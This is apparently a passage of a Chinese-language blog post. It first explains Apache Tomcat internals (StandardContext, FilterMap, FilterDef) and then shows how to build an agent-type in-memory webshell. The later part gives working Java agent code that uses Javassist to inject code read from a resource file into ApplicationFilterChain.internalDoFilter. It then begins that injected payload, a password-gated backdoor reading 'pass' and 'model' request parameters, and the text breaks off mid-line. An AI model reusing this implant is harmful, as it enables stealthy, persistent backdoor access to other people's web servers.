<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Add a filter mapping to this Context at the end of the current set</span></span><br><span class="line"><span class="comment"> * of filter mappings.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> filterMap The filter mapping to be added</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@exception</span> IllegalArgumentException if the specified filter name</span></span><br><span class="line"><span class="comment"> *  does not match an existing filter definition, or the filter mapping</span></span><br><span class="line"><span class="comment"> *  is malformed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addFilterMap</span><span class="params">(FilterMap filterMap)</span> </span>&#123;</span><br><span class="line">    validateFilterMap(filterMap);</span><br><span class="line">    <span class="comment">// Add this filter mapping to our registered set</span></span><br><span class="line">    filterMaps.add(filterMap);</span><br><span class="line">    fireContainerEvent(<span class="string">&quot;addFilterMap&quot;</span>, filterMap);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>createWrapper</p>
<p>创建并返回一个新的Wrapper实例</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Factory method to create and return a new Wrapper instance, of</span></span><br><span class="line"><span class="comment">     * the Java implementation class appropriate for this Context</span></span><br><span class="line"><span class="comment">     * implementation.  The constructor of the instantiated Wrapper</span></span><br><span class="line"><span class="comment">     * will have been called, but no properties will have been set.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Wrapper <span class="title">createWrapper</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        Wrapper wrapper = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (wrapperClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                wrapper = (Wrapper) wrapperClass.getConstructor().newInstance();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                ExceptionUtils.handleThrowable(t);</span><br><span class="line">                log.error(<span class="string">&quot;createWrapper&quot;</span>, t);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            wrapper = <span class="keyword">new</span> StandardWrapper();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">synchronized</span> (wrapperLifecyclesLock) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; wrapperLifecycles.length; i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Class&lt;?&gt; clazz = Class.forName(wrapperLifecycles[i]);</span><br><span class="line">                    LifecycleListener listener =</span><br><span class="line">                        (LifecycleListener) clazz.getConstructor().newInstance();</span><br><span class="line">                    wrapper.addLifecycleListener(listener);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                    ExceptionUtils.handleThrowable(t);</span><br><span class="line">                    log.error(<span class="string">&quot;createWrapper&quot;</span>, t);</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">synchronized</span> (wrapperListenersLock) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; wrapperListeners.length; i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Class&lt;?&gt; clazz = Class.forName(wrapperListeners[i]);</span><br><span class="line">                    ContainerListener listener =</span><br><span class="line">                            (ContainerListener) clazz.getConstructor().newInstance();</span><br><span class="line">                    wrapper.addContainerListener(listener);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                    ExceptionUtils.handleThrowable(t);</span><br><span class="line">                    log.error(<span class="string">&quot;createWrapper&quot;</span>, t);</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> wrapper;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>addChild</p>
<p>添加子容器</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Add a child Container, only if the proposed child is an implementation</span></span><br><span class="line"><span class="comment">     * of Wrapper.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> child Child container to be added</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@exception</span> IllegalArgumentException if the proposed container is</span></span><br><span class="line"><span class="comment">     *  not an implementation of Wrapper</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addChild</span><span class="params">(Container child)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Global JspServlet</span></span><br><span class="line">        Wrapper oldJspServlet = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!(child <span class="keyword">instanceof</span> Wrapper)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException</span><br><span class="line">                (sm.getString(<span class="string">&quot;standardContext.notWrapper&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> isJspServlet = <span class="string">&quot;jsp&quot;</span>.equals(child.getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Allow webapp to override JspServlet inherited from global web.xml.</span></span><br><span class="line">        <span class="keyword">if</span> (isJspServlet) &#123;</span><br><span class="line">            oldJspServlet = (Wrapper) findChild(<span class="string">&quot;jsp&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (oldJspServlet != <span class="keyword">null</span>) &#123;</span><br><span class="line">                removeChild(oldJspServlet);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">super</span>.addChild(child);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isJspServlet &amp;&amp; oldJspServlet != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * The webapp-specific JspServlet inherits all the mappings</span></span><br><span class="line"><span class="comment">             * specified in the global web.xml, and may add additional ones.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            String[] jspMappings = oldJspServlet.findMappings();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; jspMappings!=<span class="keyword">null</span> &amp;&amp; i&lt;jspMappings.length; i++) &#123;</span><br><span class="line">                addServletMappingDecoded(jspMappings[i], child.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><p>addServletMappingDecoded</p>
<p>servletMappings是一个HashMap类型的变量，存储了servletPath和servletName的键值对关系，addServletMappingDecoded函数实现了将servletPath和servletName添加为一个映射的功能；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addServletMappingDecoded</span><span class="params">(String pattern, String name,</span></span></span><br><span class="line"><span class="params"><span class="function">                                  <span class="keyword">boolean</span> jspWildCard)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// Validate the proposed mapping</span></span><br><span class="line">        <span class="keyword">if</span> (findChild(name) == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException</span><br><span class="line">                (sm.getString(<span class="string">&quot;standardContext.servletMap.name&quot;</span>, name));</span><br><span class="line">        String adjustedPattern = adjustURLPattern(pattern);</span><br><span class="line">        <span class="keyword">if</span> (!validateURLPattern(adjustedPattern))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException</span><br><span class="line">                (sm.getString(<span class="string">&quot;standardContext.servletMap.pattern&quot;</span>, adjustedPattern));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Add this mapping to our registered set</span></span><br><span class="line">        <span class="keyword">synchronized</span> (servletMappingsLock) &#123;</span><br><span class="line">            String name2 = servletMappings.get(adjustedPattern);</span><br><span class="line">            <span class="keyword">if</span> (name2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// Don&#x27;t allow more than one servlet on the same pattern</span></span><br><span class="line">                Wrapper wrapper = (Wrapper) findChild(name2);</span><br><span class="line">                wrapper.removeMapping(adjustedPattern);</span><br><span class="line">            &#125;</span><br><span class="line">            servletMappings.put(adjustedPattern, name);</span><br><span class="line">        &#125;</span><br><span class="line">        Wrapper wrapper = (Wrapper) findChild(name);</span><br><span class="line">        wrapper.addMapping(adjustedPattern);</span><br><span class="line"></span><br><span class="line">        fireContainerEvent(<span class="string">&quot;addServletMapping&quot;</span>, adjustedPattern);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="FilterMap"><a href="#FilterMap" class="headerlink" title="FilterMap"></a>FilterMap</h4><p>Web 应用程序的filter映射，如部署描述符中<code>&lt;filter-mapping&gt;</code>元素所表示，FilterMap提供了一些方法用来添加filter映射关系。</p>
<ol>
<li><p>addURLPattern</p>
<p>添加映射匹配的URL</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addURLPattern</span><span class="params">(String urlPattern)</span> </span>&#123;</span><br><span class="line">        addURLPatternDecoded(UDecoder.URLDecode(urlPattern, getCharset()));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
<li><p>setFilterName</p>
<p>设置FilterName</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setFilterName</span><span class="params">(String filterName)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.filterName = filterName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>setDispatcher</p>
<p>此方法将用于设置 FilterMap 的当前状态，表示应应用过滤器的状态</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * This method will be used to set the current state of the FilterMap</span></span><br><span class="line"><span class="comment"> * representing the state of when filters should be applied.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> dispatcherString the dispatcher type which should</span></span><br><span class="line"><span class="comment"> *  match this filter</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDispatcher</span><span class="params">(String dispatcherString)</span> </span>&#123;</span><br><span class="line">    String dispatcher = dispatcherString.toUpperCase(Locale.ENGLISH);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dispatcher.equals(DispatcherType.FORWARD.name())) &#123;</span><br><span class="line">        <span class="comment">// apply FORWARD to the global dispatcherMapping.</span></span><br><span class="line">        dispatcherMapping |= FORWARD;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (dispatcher.equals(DispatcherType.INCLUDE.name())) &#123;</span><br><span class="line">        <span class="comment">// apply INCLUDE to the global dispatcherMapping.</span></span><br><span class="line">        dispatcherMapping |= INCLUDE;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (dispatcher.equals(DispatcherType.REQUEST.name())) &#123;</span><br><span class="line">        <span class="comment">// apply REQUEST to the global dispatcherMapping.</span></span><br><span class="line">        dispatcherMapping |= REQUEST;</span><br><span class="line">    &#125;  <span class="keyword">else</span> <span class="keyword">if</span> (dispatcher.equals(DispatcherType.ERROR.name())) &#123;</span><br><span class="line">        <span class="comment">// apply ERROR to the global dispatcherMapping.</span></span><br><span class="line">        dispatcherMapping |= ERROR;</span><br><span class="line">    &#125;  <span class="keyword">else</span> <span class="keyword">if</span> (dispatcher.equals(DispatcherType.ASYNC.name())) &#123;</span><br><span class="line">        <span class="comment">// apply ERROR to the global dispatcherMapping.</span></span><br><span class="line">        dispatcherMapping |= ASYNC;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="FilterDef"><a href="#FilterDef" class="headerlink" title="FilterDef"></a>FilterDef</h4><p>Web 应用程序的filter定义，如部署描述符中的 <code>&lt;filter&gt; </code>元素所示，FilterDef提供了一些方法用来设置filter定义。</p>
<ol>
<li><p>setFilter</p>
<p>设置Filter</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The filter instance associated with this definition</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> Filter filter = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Filter <span class="title">getFilter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> filter;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setFilter</span><span class="params">(Filter filter)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.filter = filter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>setFilterName</p>
<p>设置Filter名</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The name of this filter, which must be unique among the filters</span></span><br><span class="line"><span class="comment"> * defined for a particular web application.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> String filterName = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getFilterName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">this</span>.filterName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setFilterName</span><span class="params">(String filterName)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (filterName == <span class="keyword">null</span> || filterName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(</span><br><span class="line">                sm.getString(<span class="string">&quot;filterDef.invalidFilterName&quot;</span>, filterName));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.filterName = filterName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>setFilterClass</p>
<p>设置Filter类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The fully qualified name of the Java class that implements this filter.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> String filterClass = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getFilterClass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">this</span>.filterClass);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setFilterClass</span><span class="params">(String filterClass)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.filterClass = filterClass;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h2><h3 id="Agent型内存马"><a href="#Agent型内存马" class="headerlink" title="Agent型内存马"></a>Agent型内存马</h3><p>在Container请求处理流程源码分析中，我们知道在调用过滤器链时，会调用ApplicationFilterChain类的doFilter方法,doFilter方法它会将处理委托给internalDoFilter方法，pos和n是ApplicationFilterChain的成员变量，分别表示过滤器链的当前位置和过滤器总数，所以当pos小于n时，会不断执行ApplicationFilterChain的doFilter方法，因此我们可以用internalDoFilter方法作为内存马入口方法。</p>
<p>1、定义AgentMain，TransformerDemo，在定义一个readSource方法来读取恶意代码。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.UnmodifiableClassException;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentMain</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> <span class="keyword">throws</span> UnmodifiableClassException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;agentmain invoke ! ! !&quot;</span>);</span><br><span class="line">        Class[] classes = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class aClass : classes) &#123;</span><br><span class="line">            <span class="keyword">if</span> (aClass.getName().equals(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>)) &#123;</span><br><span class="line">                inst.addTransformer(<span class="keyword">new</span> TransformerDemo(), <span class="keyword">true</span>);</span><br><span class="line">                inst.retransformClasses(aClass);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TransformerDemo</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ClassPool cp = ClassPool.getDefault();</span><br><span class="line">            ClassClassPath classPath = <span class="keyword">new</span> ClassClassPath(classBeingRedefined);</span><br><span class="line">            cp.insertClassPath(classPath);</span><br><span class="line">            CtClass ctc = cp.get(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);</span><br><span class="line">            CtMethod method = ctc.getDeclaredMethod(<span class="string">&quot;internalDoFilter&quot;</span>);</span><br><span class="line">            String source = readSource();</span><br><span class="line">            method.insertBefore(source);</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = ctc.toBytecode();</span><br><span class="line">            ctc.detach();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readSource</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        StringBuilder source=<span class="keyword">new</span> StringBuilder();</span><br><span class="line">        InputStream is = TransformerDemo.class.getClassLoader().getResourceAsStream(<span class="string">&quot;source.txt&quot;</span>);</span><br><span class="line">        InputStreamReader isr = <span class="keyword">new</span> InputStreamReader(is);</span><br><span class="line">        String line=<span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            BufferedReader br = <span class="keyword">new</span> BufferedReader(isr);</span><br><span class="line">            <span class="keyword">while</span>((line=br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                source.append(line);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> source.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>2、source.txt </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">	javax.servlet.http.HttpServletRequest request=$<span class="number">1</span>;</span><br><span class="line">	javax.servlet.http.HttpServletResponse response = $<span class="number">2</span>;</span><br><span class="line">	String pass=request.getParameter(<span class="string">&quot;pass&quot;</span>);</span><br><span class="line">	String model=request.getParameter(<span class="string">&quot;model&quot;</span>);</span><br><span class="line">	String result=<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (pass!=<span class="keyword">null</span>&amp;&amp;pass.equals(<span class="string">&quot;self&quot;</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (model.equals(<span 